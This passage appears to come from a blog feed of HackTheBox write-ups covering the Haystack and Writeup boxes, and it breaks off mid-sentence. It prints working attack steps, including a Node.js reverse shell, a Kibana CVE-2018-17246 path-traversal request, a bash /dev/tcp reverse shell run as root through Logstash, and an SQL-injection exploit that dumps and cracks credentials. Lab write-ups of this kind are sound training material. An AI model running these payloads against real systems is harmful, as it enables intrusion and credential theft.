&#125;,</span><br><span class="line">                <span class="attr">&quot;_type&quot;</span>: <span class="string">&quot;quote&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;max_score&quot;</span>: <span class="number">5.9335938</span>,</span><br><span class="line">        <span class="attr">&quot;total&quot;</span>: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;timed_out&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;took&quot;</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Neat, sounds promising. Let’s decode :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;dXNlcjogc2VjdXJpdHkg&#x27;</span> | base64 -d</span><br><span class="line">user: security</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;cGFzczogc3BhbmlzaC5pcy5rZXk=&#x27;</span> | base64 -d</span><br><span class="line">pass: spanish.is.key</span><br></pre></td></tr></table></figure><p>An username and a password, couldn’t ask for anything better! Is that SSH credentials ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh security@haystack.htb</span><br><span class="line">security@haystack.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Thu Aug 29 16:24:15 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">[security@haystack ~]$</span></span><br><span class="line"><span class="string">[security@haystack ~]$ cat user.txt</span></span><br><span class="line"><span class="string">04d1xxxxxxxxxxxxxxx8eb929</span></span><br></pre></td></tr></table></figure><p>First step done. Time for root.</p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>Now that we have user let’s try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let’s focus on the ELK stack again which seems the core part of this box.</p><h3 id="Pivot-security-gt-kibana-user"><a href="#Pivot-security-gt-kibana-user" class="headerlink" title="Pivot security -&gt; kibana user"></a>Pivot security -&gt; kibana user</h3><p>Kibana and Logstash are installed but configuration files are inaccesible to the <code>security</code> user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[security@haystack conf.d]$ cat /etc/passwd</span><br><span class="line">[...]</span><br><span class="line">security:x:1000:1000:security:/home/security:/bin/bash</span><br><span class="line">elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin</span><br><span class="line">logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin</span><br><span class="line">kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ <span class="built_in">cd</span> /opt/kibana/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /opt/kibana/: Permiso denegado</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ cat /etc/logstash/conf.d/filter.conf</span><br><span class="line">cat: /etc/logstash/conf.d/filter.conf: Permiso denegado</span><br></pre></td></tr></table></figure><p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p><p>For now we don’t have informations about neither Kibana nor Logstash. Let’s check Elasticsearch again :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:<span class="number">9200</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;cluster_name&quot;</span>: <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;cluster_uuid&quot;</span>: <span class="string">&quot;pjrX7V_gSFmJY-DxP4tCQg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;iQEYHgS&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tagline&quot;</span>: <span class="string">&quot;You Know, for Search&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;build_date&quot;</span>: <span class="string">&quot;2018-09-26T13:34:09.098244Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_flavor&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_hash&quot;</span>: <span class="string">&quot;04711c2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;build_snapshot&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;build_type&quot;</span>: <span class="string">&quot;rpm&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lucene_version&quot;</span>: <span class="string">&quot;7.4.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_index_compatibility_version&quot;</span>: <span class="string">&quot;5.0.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;minimum_wire_compatibility_version&quot;</span>: <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;number&quot;</span>: <span class="string">&quot;6.4.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That’s quite old.</p><p>And indeed after a bit of GoogleFu we stumbled upon CVE-2018-17246 :</p><blockquote><p>Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p></blockquote><p>More informations are available on <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/">CyberArk website</a> and gives us example on how to run this exploit.</p><p>First we need to write a NodeJS reserve shell (I used the one found <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell">here</a>) to the <code>/tmp/hg8.js</code> folder:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">8585</span>, <span class="string">&quot;10.10.10.10&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>Start <code>netcat</code> utility to listen for the reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Let’s now launch the exploit on the local instance of Kibana.<br>According to the <a href="https://www.elastic.co/guide/en/kibana/current/settings.html">documentation</a> Kibana runs on port <code>5601</code> :</p><blockquote><p>The default settings configure Kibana to run on localhost:5601.</p></blockquote><p>We now have every informations needed, let’s launch our exploit:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js&quot;</span></span><br></pre></td></tr></table></figure><p>On our <code>netcat</code> the connection appear :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.10:53792</span><br><span class="line">id</span><br><span class="line">uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0</span><br></pre></td></tr></table></figure><p>Good we are on Kibana user now.</p><p>Let’s upgrade our shell to a fully interactive one for easiest work (check out this <a href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/">blog post</a> for more informations):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ <span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line">$ <span class="comment"># CTRL + Z</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">                        reset</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="Logstash-gt-root"><a href="#Logstash-gt-root" class="headerlink" title="Logstash -&gt; root"></a>Logstash -&gt; root</h3><p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can’t be accessed.</p><p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let’s dig.</p><p>As a reminder Logstash is a tool that collect various logs, parses them, and writes the parsed data to an Elasticsearch cluster :</p><blockquote><p>Logstash (part of the Elastic Stack) integrates data from any source, in any format with this flexible, open source collection, parsing, and enrichment pipeline.<br><a href="https://www.elastic.co/fr/products/logstash">https://www.elastic.co/fr/products/logstash</a></p></blockquote><p>Once reading the <code>startup.options</code> file, an information catch the eye :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/logstash/startup.options</span><br><span class="line"><span class="comment"># user and group id to be invoked as</span></span><br><span class="line"><span class="comment">#LS_USER=logstash</span></span><br><span class="line"><span class="comment">#LS_GROUP=logstash</span></span><br><span class="line">LS_USER=root</span><br><span class="line">LS_GROUP=root</span><br></pre></td></tr></table></figure><p>So Logstash will run not as <code>logstash</code> user but as <code>root</code> user. We are on the right track.<br>The <code>conf.d</code> folder contains three files. According to its contents, here what each file do:</p><ul><li><code>input.conf</code> tell Logstash where to search for logs.</li><li><code>filter.conf</code> filter what data is treated and what is ignored.</li><li><code>output.conf</code> define what to do with parsed data.</li></ul><p>Let’s look first at <code>input.conf</code> and <code>output.conf</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat input.conf</span><br><span class="line">input &#123;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; <span class="string">&quot;/opt/kibana/logstash_*&quot;</span></span><br><span class="line">        start_position =&gt; <span class="string">&quot;beginning&quot;</span></span><br><span class="line">        sincedb_path =&gt; <span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">        stat_interval =&gt; <span class="string">&quot;10 second&quot;</span></span><br><span class="line">        <span class="built_in">type</span> =&gt; <span class="string">&quot;execute&quot;</span></span><br><span class="line">        mode =&gt; <span class="string">&quot;read&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat output.conf</span><br><span class="line">output &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;execute&quot;</span> &#123;</span><br><span class="line">        stdout &#123; codec =&gt; json &#125;</span><br><span class="line">        <span class="built_in">exec</span> &#123;</span><br><span class="line">            <span class="built_in">command</span> =&gt; <span class="string">&quot;%&#123;comando&#125; &amp;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to this config Logstash will, every 10 seconds :</p><ol><li>Check for file named <code>logstash_*</code> in the <code>/opt/kibana/</code> folder.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">path =&gt; &quot;/opt/kibana/logstash_*&quot;</span><br><span class="line">stat_interval =&gt; &quot;10 second&quot;</span><br><span class="line">type =&gt; &quot;execute&quot;</span><br><span class="line">mode =&gt; &quot;read&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>Check the file content for data matching filters (a regex) defined in <code>filter.conf</code>.</p></li><li><p>Send the matched data to be executed in background :</p></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec &#123;</span><br><span class="line">    command =&gt; <span class="attr">&quot;%&#123;comando&#125; &amp;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Good, it seems we can write any command in a file named <code>/opt/kibana/logstash_*</code> and it should be run as root. Neat.<br>But first we have to make sure the command match the filter to be parsed correctly by logstash.</p><p>Let’s understand that filter :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat filter.conf</span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;execute&quot;</span> &#123;</span><br><span class="line">        grok &#123;</span><br><span class="line">            match =&gt; &#123; <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot;</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>That’s a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p><blockquote><p>Grok is a great way to parse unstructured log data into something structured and queryable.</p></blockquote><p>So it’s a kind of regex. Let’s understand it step by step :</p><p><code>Ejecutar\s*comando\s*:\s+</code> is a simple regex, meaning that the file have to begin with this sentence.<br><code>%&#123;GREEDYDATA:comando&#125;</code> is the interresting grok part. According to the <a href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/grok-patterns">grok pattern source</a> <code>GREEDYDATA</code> correspond to a <code>.*</code> in regex.</p><p>So basically, when given the following line : <code>Ejecutar comando : id</code> grok will match the line and take the <code>id</code> part and parse it as <code>commando</code> variable to the Logstash output (<code>command =&gt; &quot;%&#123;comando&#125; &amp;&quot;</code> as seen in <code>output.conf</code>).</p><p>Let’s put all those informations together and try to get a root shell.</p><p>First as usual let’s open a <code>netcat</code> listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br></pre></td></tr></table></figure><p>Then create the file Logstash will take as input (<code>/opt/kibana/logstash_*</code>) with the correct content matching the <code>filter.conf</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4485 0&gt;&amp;1&quot;</span> &gt; /opt/kibana/logstash_hg8</span><br></pre></td></tr></table></figure><p>We then wait a bit and fairly quicky we get an incoming connection as root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br><span class="line">Connection from 10.10.10.115:49446</span><br><span class="line">bash: no hay control de trabajos en este shell</span><br><span class="line">[root@haystack /]<span class="comment"># cat /root/root.txt</span></span><br><span class="line">3f5f727xxxxxxxxxxxx9d92</span><br><span class="line">[root@haystack /]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>As always do not hesitate to contact me for any questions or feedbacks ;)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> haystack </tag>
            
            <tag> gobuster </tag>
            
            <tag> steganography </tag>
            
            <tag> elasticsearch </tag>
            
            <tag> logstash </tag>
            
            <tag> kibana </tag>
            
            <tag> elk </tag>
            
            <tag> cve-2018-17246 </tag>
            
            <tag> lfi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Writeup</title>
      <link href="/posts/writeup/"/>
      <url>/posts/writeup/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="writeup-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158812-62e05800-988a-11ea-876f-7954091cecbb.png"><p>Writeup was my first machine I solved to start my CTF journey. It’s an easy rated box but still interesting and perfect to jump into the CTF bath!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC writeup.htb           </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 10:39 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> writeup.htb (10.10.10.138)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/writeup/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Nothing here yet.</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 32.23 seconds</span><br></pre></td></tr></table></figure><p>A classic, port 80 and 22. <code>nmap</code> did a bit extra work for us and found the the <code>robots.txt</code> show an interesting entry : <code>/writeup/</code></p><p>First thing we see when opening the 80 port is this message :</p><p><img src="https://user-images.githubusercontent.com/9076747/64074062-b592c900-cc95-11e9-97eb-5199438c8feb.png" alt="2019-09-01-105047_1387x643_scrot"></p><p>So there a DOS protection checking apache logs for 40X errors. Probably a fail2ban or something. Let’s avoid classic enumeration scripts to not get banned.</p><p>The footer says :</p><blockquote><p>Page is hand-crafted with vi.</p></blockquote><p>That’s an interesting fact to keep in mind, maybe can access vi backups file (something like <code>index.php~</code> or <code>index.php.swp</code>) and have a look at the source code.</p><p>The <code>/writeup/</code> endpoint countains, well, writeups. The website seems rather basic :</p><p><img src="https://user-images.githubusercontent.com/9076747/64074102-a3fdf100-cc96-11e9-92fb-53bcb44da0ba.png" alt="2019-09-01-105747_1455x764_scrot"></p><p>Each writeup is accessible throught the URL in the following form : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://writeup.htb/writeup/index.php?page=&#123;writeup-name&#125;</span><br></pre></td></tr></table></figure><p>After digging a bit we found there is no Local File Inclusion vulnerabilities nor <code>vim</code> backup files accessible. </p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Checking the source code inform us that the website was made using <code>CMS Made Simple</code> :</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http writeup.htb/writeup/index.php</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>CMSSESSID9d3962=lgt7j00rvndgl4; path=/</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en_US&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Home - writeup<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://writeup.htb/writeup/&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Generator&quot;</span> <span class="attr">content</span>=<span class="string">&quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">[...]</span></span><br></pre></td></tr></table></figure><p>A quick search return a fairly recent vulnerability, CVE-2019-9053 :</p><blockquote><p>An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter.</p></blockquote><p>And an exploit is already available, perfect! </p><p>Looking at the source code we can see we have a very well crafted and complete exploit. It will :</p><ol><li>Dump the salt used by CMS Made Simple</li><li>Dump the username</li><li>Dump the email </li><li>Dump the password</li><li>And even have a function to crack the found hashed password</li></ol><p> Let’s try it :</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://www.exploit-db.com/raw/46635 -O cmssimple.py</span><br><span class="line">[hg8@archbook ~]$ python cmssimple.py -u http://writeup.htb/writeup/ --crack -w <span class="string">&quot;~/SecLists/Passwords/Leaked-Databases/rockyou.txt&quot;</span></span><br><span class="line">[+] Salt <span class="keyword">for</span> password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line">[+] Password cracked: raykayjay9</span><br></pre></td></tr></table></figure><p>Really nice exploit here. So we have an username and a password.</p><p>The CMS Made Simple admin page can not be accessed using those credentials, so let’s try with SSH :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh jkr@writeup.htb</span><br><span class="line">jkr@writeup.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Devuan GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">Last login: Sun Sep  1 05:07:51 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">jkr@writeup:~$ cat user.txt </span></span><br><span class="line"><span class="string">d4e493fd40xxxxxxxxxxxxxx319f978</span></span><br><span class="line"><span class="string">jkr@writeup:~$ </span></span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>As a recon phase let’s run <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to check running process. And paying closer attention de process run as root.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment"># Attacker box</span></span><br><span class="line">[hg8@archbook ~]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><br><span class="line">[hg8@archbook ~]$ scp pspy64 jkr@writeup.htb:~ </span><br><span class="line">jkr@writeup.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">pspy64   100% 3006KB 111.9KB/s   00:26    </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ chmod +x pspy64  &amp;&amp; ./pspy64</span><br></pre></td></tr></table></figure><p>After watching the processes for a while, we will see a few other users succeding the user challenge and connect to SSH aswell. And something interresting appears :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">05:37:15 CMD: UID=0    PID=11674  | sshd: [accepted]</span><br><span class="line">05:37:15 CMD: UID=102  PID=11675  | sshd: [net]       </span><br><span class="line">05:37:29 CMD: UID=0    PID=11676  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=0    PID=11677  | sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br><span class="line">05:37:29 CMD: UID=0    PID=11678  | run-parts --lsbsysinit /etc/update-motd.d </span><br><span class="line">05:37:29 CMD: UID=0    PID=11679  | uname -rnsom </span><br><span class="line">05:37:29 CMD: UID=0    PID=11680  | sshd: jkr [priv]  </span><br><span class="line">05:37:29 CMD: UID=1000 PID=11681  | sshd: jkr@pts/2</span><br></pre></td></tr></table></figure><p>A few commands are run as <code>root</code> upon users login. Let’s dig.</p><p>First command that caught the attention is <code>run-parts --lsbsysinit 